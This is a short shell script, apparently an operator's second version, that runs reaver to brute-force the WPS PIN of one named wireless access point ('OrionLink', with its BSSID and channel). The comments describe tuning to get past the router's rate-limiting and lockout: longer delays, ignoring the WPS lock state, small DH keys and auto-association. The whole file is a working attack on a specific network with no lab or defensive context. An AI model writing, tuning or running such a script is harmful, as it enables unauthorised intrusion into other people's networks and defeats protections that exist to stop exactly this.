#!/bin/sh
# WPS Brute Force v2 - Anti rate-limit tuning
# Target: OrionLink CC:28:AA:66:30:08, Channel 2
# v1 was getting deauthed on every attempt (code 0x02)
# This version: longer delays, small DH, auto-associate

IFACE="wlan1mon"
BSSID="CC:28:AA:66:30:08"
CHAN="2"
LOG="/tmp/wps_brute_v2.log"

# Kill existing reaver
killall reaver 2>/dev/null
sleep 2

# Clean session files
rm -f /etc/reaver/CC28AA663008.wpc 2>/dev/null

echo "=== WPS Brute Force v2 (Anti Rate-Limit) ===" | tee "$LOG"
echo "Target: OrionLink ($BSSID) Ch$CHAN" | tee -a "$LOG"
echo "Started: $(date)" | tee -a "$LOG"
echo "Flags: -d 30 -r 3:300 -S -A -N -L -T 5 -t 15" | tee -a "$LOG"
echo "" | tee -a "$LOG"

# Reaver v2 flags:
# -d 30  : 30s delay between PINs (vs 3s in v1)
# -r 3:300: after 3 attempts, pause 300s (5 min, vs 60s in v1)
# -S     : use small DH keys (faster exchange, less likely to timeout)
# -A     : auto-associate (don't rely on AP association)
# -N     : no NACK detection
# -L     : ignore WPS lock state
# -T 5   : timeout 5s for M5/M7 wait (vs 3s)
# -t 15  : receive timeout 15s (vs 10s)
# -vv    : verbose output

(reaver -i "$IFACE" -b "$BSSID" -c "$CHAN" -vv \
    -d 30 -r 3:300 -S -A -N -L -T 5 -t 15 \
    >> "$LOG" 2>&1 < /dev/null) &

sleep 3

PID=$(pidof reaver)
if [ -n "$PID" ]; then
    echo "[+] Reaver v2 running as PID $PID" | tee -a "$LOG"
    echo "[+] Log: $LOG"
    echo "[+] Monitor: tail -f $LOG"
else
    echo "[-] Failed to start reaver" | tee -a "$LOG"
fi
